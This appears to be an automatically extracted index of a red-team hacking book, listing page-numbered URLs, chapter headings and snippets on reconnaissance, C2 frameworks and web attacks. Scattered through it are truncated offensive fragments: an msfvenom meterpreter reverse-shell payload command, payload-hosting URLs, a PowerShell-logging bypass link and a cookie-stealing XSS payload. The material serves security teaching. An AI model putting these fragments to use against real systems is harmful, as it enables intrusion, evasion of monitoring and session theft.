+- p. 237: http://hashcat.net/wiki/doku.php?id=example_hashes.
+- p. 239: https://github.com/hashcat/hashcat-utils/releases.
+- p. 240: https://github.com/cheetz/brutescrape
+- p. 240: https://portswigger.net/bappstore/21df56baa03d499c8439018fe075d3d7
+- p. 240: https://thesprawl.org/projects/pack/:
+- p. 240: https://github.com/digininja/pipal
+- p. 241: https://github.com/brannondorsey/PassGAN
+- p. 241: https://www.usenix.org/conference/usenixsecurity16/technical-
+- p. 241: https://gist.github.com/rain-
+- p. 242: https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs
+- p. 242: https://arno0x0x.wordpress.com/2017/11/20/windows-oneliners-to-
+- p. 242: http://webserver/payload.sct
+- p. 242: http://webserver/payload.hta
+- p. 242: http://webserver/p
+- p. 242: http://webserver/payload
+- p. 242: http://webserver/payload.b64
+- p. 243: https://github.com/decoder-it/psgetsystem
+- p. 243: https://github.com/decoder-
+- p. 244: https://github.com/eladshamir/Internal-Monologue
+- p. 244: https://github.com/clong/DetectionLab
+- p. 244: https://medium.com/@clong/introducing-detection-lab-61db34bed6ae
+- p. 250: https://github.com/EmpireProject/Empire/blob/master/data/module_source/trollsploit/Get-
+- p. 256: http://thehackerplaybook.com/subscribe/.
+- p. 256: http://thehackerplaybook.com/training/.
+
+## Technique Signals
+- p. 4: 3 The Throw - Web Application Exploitation
+- p. 5: Scanning the Network with CrackMapExec (CME)
+- p. 5: Lateral Movement via RDP over the VPS
+- p. 6: Exploiting Internal Jenkins with Social Engineering
+- p. 6: Physical Tools to Bypass Access Points
+- p. 6: Recompiling Metasploit/Meterpreter to Bypass AV and Network Detection
+- p. 6: Creating a Modified Stage 0 Payload:
+- p. 7: 8 Special Teams - Cracking, Exploits, and Tricks
+- p. 8: sections that help provide a way to test a vulnerability or exploit.
+- p. 10: I can't reiterate this enough: Do not go looking for vulnerable servers and exploits on
+- p. 10: Finally, I am not an expert in Windows, coding, exploit dev, Linux, or really anything
+- p. 13: vulnerabilities, use the latest exploits, use chained vulnerabilities, and see if their
+- p. 13: campaign, you are going to need to do a ton of reconnaissance and discovery, look for
+- p. 13: the motions of Scoping, Intel Gathering, Vulnerability Analysis, Exploitation, Post
+- p. 13: Exploitation, and Reporting. In the traditional network test, we usually scan for
+- p. 14: vulnerabilities, find and take advantage of an exploitable system or application, maybe
+- p. 14: do a little post exploitation, find domain admin, and write up a report. These types of
+- p. 14: we follow is that we almost never run a vulnerability scan against the internal
+- p. 14: scans once inside a compromised environment? This is extremely rare. Why?
+- p. 14: Vulnerability scans are very loud on the network and will most likely get caught in
+- p. 19: to get a single custom malware payload to execute on their server. This payload
+- p. 19: should try to connect out in multiple ways, make sure to bypass common AV, and
+- p. 19: allow for additional payloads to be executed from memory. We will have example
+- p. 19: payloads throughout the book. Once the initial payload is executed, this is where all
+- p. 20: After you have fully created an image you like, you can rapidly clone that image to
+- p. 21: quick example of installing all of our exploitation, intel gathering, post exploitation,
+- p. 22: where Empire/Meterpreter/Cobalt Strike payloads can come from, and any phishing
+- p. 23: (https://github.com/rapid7/metasploit-framework/commits/master), which seems to be
+- p. 23: updated daily, has all of the latest public exploits, post exploitation modules, auxiliary
+- p. 23: with the MS17-010 Eternal Blue Exploit (http://bit.ly/2H2PTsI) to get our first shell or
+- p. 23: we might use Metasploit to generate a Meterpreter payload for our social engineering
+- p. 23: payloads and traffic to bypass AV and network sensors.
+- p. 23: might not be able to include a Meterpreter payload binary or have it download one
+- p. 23: msfvenom --payload windows/x64/meterpreter_reverse_http --format psh --out
+- p. 23: Meterpreter payloads, which we will be covered in more detail as we go through the
+- p. 23: get around certain network IDS tools: https://github.com/rapid7/metasploit-
+- p. 24: Strike? It is a tool for post exploitation, lateral movement, staying hidden in the
+- p. 24: network, and exfiltration. Cobalt Strike doesn't really have exploits and isn't used for
+- p. 24: when it is used as part of a phishing campaign payload. Once you can execute a
+- p. 24: Cobalt Strike payload, it creates a Beacon connection back to the Command and
+- p. 27: with your post exploitation: http://bit.ly/2qxIwPE.
+- p. 27: Empire is a post-exploitation framework that includes a pure-PowerShell2.0 Windows
+- p. 27: powershell.exe, rapidly deployable post-exploitation modules ranging from key
+- p. 27: For Red Teamers, PowerShell is one of our best friends. After the initial payload, all
+- p. 27: maintained and updated so that all the latest post-exploitation modules are available
+- p. 29: The payload is the actual malware that will run on the victim's system. These payloads
+- p. 29: Review your payload in another terminal window
+- p. 29: As you can see, the payload that was created was heavily obfuscated. You can now
+- p. 29: Office Macro or a Rubber Ducky payload, but this is just one of many examples.
+- p. 30: C2 and exfiltration over DNS provides a great mechanism to hide your traffic, evade
+- p. 30: does not require root privileges and allows both shell access and exfiltration.
+- p. 31: For the client code, we will need to compile it to make a binary for a Linux payload.
+- p. 32: commands and upload our dnscat payload. To execute our payload:
+- p. 32: like to make sure that my dnscat payload returns. For this, I generally like to start my
+- p. 32: dnscat payload with a quick bash script:
+- p. 32: This will make sure that if the client side payload dies for any reason, it will spawn a
+- p. 32: new instance every hour. Sometimes you only have one chance to get your payloads
+- p. 32: Lastly, if you are going to run this payload on Windows, you could use the dnscat2
+- p. 32: payload or… why not just do it in PowerShell?! Luke Baggett wrote up a PowerShell
+- p. 32: After our payload executes and connects back to our attacker server, we should see a
+- p. 33: if we want to use an exploit from our host system, use a browser to tunnel internal
+- p. 34: detect massive DNS queries and exfiltration. So, what do the request and responses
+- p. 35: Exploitation easier. What we tried was to build an “all in one” Post Exploitation tool
+- p. 35: which we could use to bypass all mitigations solutions (or at least some off), and that
+- p. 35: administration and post-exploitation tool mainly written in python.”
+- p. 35: penetration testers with red teaming, post-exploitation and lateral movement. The tools
+- p. 35: payload types for the Metasploit Framework. PowerShell was chosen as the base
+- p. 35: allows for a lightweight agent. It doesn't support any types of post exploitation
+- p. 35: scripts and payloads which enables usage of PowerShell for offensive security,
+- p. 38: Recon-NG, Discover, Spiderfoot, Gitrob, Masscan, Sparta, HTTP Screenshot,
+- p. 38: Vulnerability Scanners, Burp Suite and more. These were tools that we could use
+- p. 38: either externally or internally to perform reconnaissance or scanning of our victim's
+- p. 38: reconnaissance phase from a Red Team perspective.
+- p. 38: scan the environments, looking for services, cloud misconfigurations, and more.
+- p. 38: Of course, prior to scanning, make sure you have proper authorization to perform
+- p. 38: /usr/bin/nmap -T4 -oX /opt/nmap_diff/scan_$d.xml 10.100.100.0/24 >
+- p. 38: if [ -e /opt/nmap_diff/scan_$y.xml ]; then
+- p. 38: This is a very basic script that runs nmap every day using default ports and then uses
+- p. 39: In the last book, we talked heavily about the benefits of Masscan
+- p. 39: (https://github.com/robertdavidgraham/masscan) and how much faster it is than nmap.
+- p. 39: The developers of Masscan stated that, with a large enough network pipeline, you
+- p. 39: could scan the entire internet in 6 minutes. The one issue we have seen is with
+- p. 39: Masscan's reliability when scanning large ranges. It is great for doing our initial
+- p. 39: reconnaissance, but generally isn't used for diffing.
+- p. 39: Build a better network diff scanner:
+- p. 39: Build a better port list than the default nmap (i.e. nmap default misses ports like
+- p. 39: Other than regularly scanning for open ports/services, it is important for Red Teams to
+- p. 39: powerful is that it uses Masscan to scan large networks quickly and uses phantomjs to
+- p. 40: Edit the networks.txt file to pick the network you want to scan:
+- p. 40: takes an XML file from nmap output and screenshots webpages, RDP servers, and
+- p. 40: nmap [IP Range]/24 --open -p 80,443 -oX scan.xml
+- p. 40: python ./EyeWitness.py -x scan.xml --web
+- p. 41: Since many tenants use dynamic IPs, their servers might not only change rapidly, but
+- p. 42: As you can tell these ranges are huge and scanning them manually would be very hard
+- p. 42: perform reconnaissance on our targets. We can use everything from Google all the
+- p. 42: way to third party scanning services. Using these resources will allow us to dig into a
+- p. 42: Shodan (https://www.shodan.io) is a great service that regularly scans the internet,
+- p. 42: Note, I have noticed that Shodan is a little slow in its scans. It took more than a month
+- p. 42: to get my servers scanned and put into the Shodan database.
+- p. 43: The one issue we have with these scans is that they can sometime be days or weeks
+- p. 43: behind. In this case, it took one day to get scanned for title information. Additionally,
+- p. 43: Below, we ran scans to find info about our target cyberspacekittens.com. By parsing
+- p. 43: The cheap and dirty way to find these cloud servers is by manually scanning SSL
+- p. 43: for our cloud providers and scan all of them regularly to pull down SSL certificates.
+- p. 43: scan below of the cyberspacekittens range, we can see hostnames in certificates with
+- p. 43: To assist in scanning for hostnames in certificates, sslScrape was developed for THP3.
+- p. 43: This tool utilizes Masscan to quickly scan large networks. Once it identifies services
+- p. 45: infrastructure. So you can nmap all day, but if you can’t find the subdomain,
+- p. 45: tools to perform better discovery. Feel free to join in and scan the
+- p. 46: Knock is a great subdomain scan tool that takes a list of subdomains and checks it to
+- p. 46: see if it resolves. So if you have cyberspacekittens.com, Knock will take this wordlist
+- p. 46: good as your word list. Therefore, having a better wordlist increases your chances of
+- p. 47: This uses the basic wordlist from Knock. Try downloading and using a much
+- p. 47: larger wordlist. Try using the http://bit.ly/2qwxrxB list using the -u switch.
+- p. 47: wordlist. Some companies have very unique subdomains that can't be found through a
+- p. 47: common wordlist. The next best resource to go to are search engines. As sites get
+- p. 47: which may limit the results from your scan. To run Sublister:
+- p. 47: with the goal of creating the fastest, and most accurate subdomain enumeration tool.
+- p. 48: tests and Red Team assessments where we were able to get passwords, API keys, old
+- p. 48: Truffle Hog tool scans different commit histories and branches for high entropy keys,
+- p. 49: the code locally, then scan it with Truffle-hog and repo-supervisor. You will first need
+- p. 49: This will clone the repo and start scanning. You can even run through whole
+- p. 50: There are many tools that can perform S3 bucket enumeration for AWS. These tools
+- p. 51: aws s3api get-bucket-acl --bucket cyberspacekittens
+- p. 52: aws s3api get-object-acl --bucket cyberspacekittens --key ignore.txt
+- p. 52: everyone. If we did have write access, we could use the put-object in s3api to modify
+- p. 55: In this chapter we went over all the different reconnaissance tactics and tools of the
+- p. 56: 3 the throw - web application exploitation
+- p. 57: of web, back in the early 2000s, there were tons of SQLi and RFI type exploits.
+- p. 57: Endpoint/Firewall Protection, our focus is shifting back onto application exploitation.
+- p. 57: We have also seen a huge complexity increase in applications, APIs, and languages,
+- p. 57: deeply into all of the different web vulnerabilities or how to manually exploit them.
+- p. 57: repeating examples like SQLMap, IDOR attacks, and CSRF vulnerabilities in the
+- p. 57: Before we start learning how to exploit web applications, let’s talk a little about bug
+- p. 58: scanning, no automated tools, which domains can be attacked, etc.). Sometimes you
+- p. 58: you took to exploit the vulnerability, screenshots, and even a working proof of
+- p. 59: Having run my own programs before, one thing to note about exploiting vulnerabilities
+- p. 59: After finishing reconnaissance and discovery, you review all the different sites you
+- p. 59: found. Looking through your results, you don’t see the standard exploitable
+- p. 59: For all the attacks in the Web Application Exploitation chapter, a custom THP3
+- p. 60: exploit them. This is a great checklist document: http://bit.ly/2qyA9m1.
+- p. 62: You first run through all of your vulnerability scanner and web application scanner
+- p. 62: common vuln scanners and has patched most of its issues. The golden egg findings
+- p. 63: Retire.JS: scan a web app for use of vulnerable JavaScript libraries. The goal of
+- p. 63: Burp Suite (~$350): although this commercial tool is a bit expensive, it is
+- p. 63: base. If you can't afford Burp, OWASP ZAP (which is free) is an excellent
+- p. 63: Before we do any type of scanning, it is important to try to understand the underlying
+- p. 63: In the previous books, we went into more detail on how to use Burp Suite and how to
+- p. 64: We are going to assume, at this point, that you have Burp Suite all set up (free or paid)
+- p. 64: Spidering: In both the free and paid versions, Burp Suite has a great
+- p. 64: Content Discovery: If you are using the paid version of Burp Suite, one
+- p. 64: Active Scan: Runs automated vulnerability scanning on all parameters
+- p. 64: Similar to Burp, but completely open source and free. Has similar
+- p. 64: Your wordlists are very important. One of my favorite wordlists to use is an old one
+- p. 64: exploitable vulnerabilities from vulnerability scanner. But, on our Red Team
+- p. 65: At this point, we have all seen and dealt with Cross-Site Scripting (XSS). Testing
+- p. 65: every variable on a website with the traditional XSS attack: <script>alert(1)</script>,
+- p. 65: So, we all know that XSS attacks are client-side attacks that allow an attacker to craft a
+- p. 65: Cookie Stealing XSS: <script>document.write('<img src="http://<Your
+- p. 65: In today's world, the standard XSS payload still works pretty often, but we do come
+
+## Extracted Operational Notes
+- p. 3: reproduced or distributed in any form or by any means, or stored in a database or
+- p. 4: Penetration Testing Teams vs Red Teams
+- p. 4: 3 The Throw - Web Application Exploitation
+- p. 4: Web Attacks Introduction - Cyber Space Kittens
+- p. 4: The Red Team Web Application Attacks
+- p. 4: Cyber Space Kittens: Chat Support Systems
+- p. 5: Template Engine Attacks - Template Injections
+- p. 5: Getting Passwords from the Windows Credential Store and Browsers
+- p. 6: Exploiting Internal Jenkins with Social Engineering
+- p. 6: 6 The Onside Kick - Physical Attacks
+- p. 6: Writing Code for Red Team Campaigns
+- p. 7: 8 Special Teams - Cracking, Exploits, and Tricks
+- p. 7: Cracking the CyberSpaceKittens NTLM hashes:
+- p. 7: Building Training Labs and Monitor with Defensive Tools
+- p. 8: of all the new vulnerabilities and attacks that will be discussed. In addition to the new
+- p. 8: content, some attacks and techniques from the prior books (which are still relevant
+- p. 8: Setting Up Your Red Team Infrastructure
+- p. 8: reiterate that I am not a professional author. I just love security and love teaching
+- p. 8: security and this is one of my passion projects. I hope you enjoy it.
+- p. 8: in which to test your attacks, along with the newest tips and tricks of penetration
+- p. 8: sections that help provide a way to test a vulnerability or exploit.
+- p. 8: possible. I also try to stay away from theoretical attacks and focus on what I have seen
+- p. 9: shift in the industry from penetration testers to Red Teamers, and I want to show you
+- p. 9: you to get into the mindset of an attacker and understand “the how” of the attacks;
+- p. 9: repo/technical blog speaks volumes in security over a good resume. Whether you live
+- p. 9: penetration testing/red teaming for major financial institutions, large utility companies,
+- p. 9: spent years teaching offensive network security at colleges, spoken at multiple security
+- p. 9: conferences, been referenced in many security publications, taught courses all over the
+- p. 9: country, ran multiple public CTF competitions, and started my own security school.
+- p. 9: One of my big passion project was building a free and open security community in
+- p. 9: occasionally run into some pentesters who claim they only use open source tools. As a
+- p. 9: “real world” attack, the “bad guys” do not have these restrictions; therefore, you need
+- p. 9: whom this book is specifically intended as I truly believe anyone in security can learn.
+- p. 9: easy for advanced hackers, and other parts might not even be in your field of security.
+- p. 9: For those who are just getting into security, one of the most common things I hear
+- p. 9: labs/examples, build your lab, push your scripts/code to a public Github repository,
+- p. 10: Lastly, being a Red Team member is half about technical ability and half about having
+- p. 10: I can't reiterate this enough: Do not go looking for vulnerable servers and exploits on
+- p. 10: systems you don't own without the proper approval. Do not try to do any of the attacks
+- p. 10: bounty programs and vulnerable sites/VMs to learn off of in order to continue
+- p. 10: growing. Even for some bug bounty programs, breaking scope or going too far can get
+- p. 10: Finally, I am not an expert in Windows, coding, exploit dev, Linux, or really anything
+- p. 13: the Cyber Kittens weapons facility. They are now back with their brand new space
+- p. 13: division called Cyber Space Kittens (CSK). This new division took all the lessons
+- p. 13: learned from the prior security assessment to harden their systems, set up a local
+- p. 13: security operations center, and even create security policies. They have hired you to
+- p. 13: see if all of their security controls have helped their overall posture.
+- p. 13: From the little details we have picked up, it looks like Cyber Space Kittens has
+- p. 13: CSK has hired us to perform a Red Team assessment to make sure they are secure, and
+- p. 13: vulnerabilities, use the latest exploits, use chained vulnerabilities, and see if their
+- p. 13: campaign, you are going to need to do a ton of reconnaissance and discovery, look for
+- p. 13: Before we can dive into the technical ideals behind Red Teams, I need to clarify my
+- p. 13: definitions of Penetration Testing and Red Teams. These words get thrown around
+- p. 13: Penetration Testing Execution Standard (PTES: http://www.pentest-standard.org) – it
+- p. 13: the motions of Scoping, Intel Gathering, Vulnerability Analysis, Exploitation, Post
+- p. 13: Exploitation, and Reporting. In the traditional network test, we usually scan for
+- p. 14: vulnerabilities, find and take advantage of an exploitable system or application, maybe
+- p. 14: do a little post exploitation, find domain admin, and write up a report. These types of
+- p. 14: tests create a matrix of vulnerabilities, patching issues, and very actionable results.
+- p. 14: internal security teams. Companies still need penetration testers to be a part of their
+- p. 14: Nowadays, even though companies have vulnerability management programs, S-
+- p. 14: the very expensive security tools, they still get compromised. If we look at any of the
+- p. 14: companies. We have seen in other security reports that some compromises could have
+- p. 14: these exact same bad guys or actor sets came after your company with the exact same
+- p. 14: This is where Red Teams come into play. The Red Team’s mission is to emulate the
+- p. 14: world and hard facts on how a company will respond, find gaps within a security
+- p. 14: program, identify skill gaps within employees, and ultimately increase their security
+- p. 14: For Red Teams, it is not as methodical as penetration tests. Since we are simulating
+- p. 14: where I see a huge difference between Penetration Tests and Red Team campaigns.
+- p. 14: For network pentests, we love getting to Domain Admin (DA) to gain access to the
+- p. 14: Domain Controller (DC) and calling it a day. For Red Team campaigns, based on the
+- p. 14: application whitelisting, integrity monitoring, lots of IDS/IPS/HIPS rules, and even
+- p. 14: we follow is that we almost never run a vulnerability scan against the internal
+- p. 14: network. How many adversaries have you seen start to perform full vulnerability
+- p. 14: Vulnerability scans are very loud on the network and will most likely get caught in
+- p. 15: lucky to get two weeks, if not one. Whereas, Red Teams must build campaigns that
+- p. 15: last from 2 weeks to 6 months. This is because we need to simulate real attacks, social
+- p. 15: two types of teams. Instead of a list of vulnerabilities, Red Team findings need to be
+- p. 15: geared more toward gaps in blue team processes, policies, tools, and skills. In your
+- p. 15: final report, you may have some vulnerability findings that were used for the
+- p. 15: campaign, but most findings will be gaps in the security program. Remember findings
+- p. 15: should be mainly for the security program, not IT.
+- p. 15: Methodical Security Assessments: Flexible Security Assessments:
+- p. 15: With Red Teams, we need to show value back to the company. It isn’t about the
+- p. 15: number of total vulnerability counts or criticality of individual vulnerabilities; it is
+- p. 15: about proving how the security program is running. The goal of the Red Team is to
+- p. 15: not new concepts, but still valuable ones for Red Teams.
+- p. 15: Even though their AV, host-based security system, or monitoring tools might trigger,
+- p. 16: when the firewall block, DNS sinkhole, or network isolation is implemented. The
+- p. 16: other valuable information to record is how the Security Teams work with IT, how
+- p. 16: mature our programs, but they don't always provide real world security for a
+- p. 16: company. As Red Teamers, our job is to test if the overall security program is
+- p. 16: As you read through this book, I want you to put yourself in the Red Team mindset
+- p. 16: Live in a world of constant Red Team infections
+- p. 16: Challenge the system… Provide real data to prove security gaps.
+- p. 18: As a Red Team, we don’t really care as much about the origins of an attack. Instead,
+- p. 18: detailed report from FireEye on an attack they analyzed
+- p. 18: A detailed breakdown for APT attacks is MITRE’s Adversarial Tactics, Techniques,
+- p. 18: TTPs commonly used with all sorts of attacks.
+- p. 18: suspected APT groups and their toolsets. This is a useful list for us as Red Teamers to
+- p. 18: simulate different attacks. Of course, we might not use the same tools as documented
+- p. 19: This is where Red Team campaigns heavily differ from penetration tests. Since Red
+- p. 19: Team campaigns focus on detection/mitigation instead of vulnerabilities, we can do
+- p. 19: In these scenarios, Red Teams work with a limited group of people inside the company
+- p. 19: This is one of my favorite parts of running Red Teams. Before you compromise your
+- p. 19: first system, you need to scope out your Red Team campaign. In a lot of penetration
+- p. 19: In Red Team campaigns, we start out with a few objectives. These objectives can
+- p. 20: What techniques are you going to use? We talked about using MITRE
+- p. 20: world with the abundance of Virtual Private Servers (VPS), standing up your attacker
+- p. 20: After you have fully created an image you like, you can rapidly clone that image to
+- p. 20: Storage space usually isn't an issue
+- p. 21: way to build your servers is to integrate TrustedSec's The PenTesters Framework
+- p. 21: quick example of installing all of our exploitation, intel gathering, post exploitation,
+- p. 21: PowerShell, and vulnerability analysis tools.
+- p. 21: If we take a look at our attacker VPS, we can see all of the tools installed on our box.
+- p. 22: attacker server, you will want to limit where SSH authentications can initiate from,
+- p. 22: reported/). You definitely don't want your attacker servers compromised with your
+- p. 22: I have also seen some Red Teams run Kali Linux (or at least Metasploit) in Docker
+- p. 22: for Red Teams [https://github.com/Coalfire-Research/Red-Baron]. Whether you want
+- p. 22: There are a myriad of tools a Red Team might use, but let’s talk about some of the
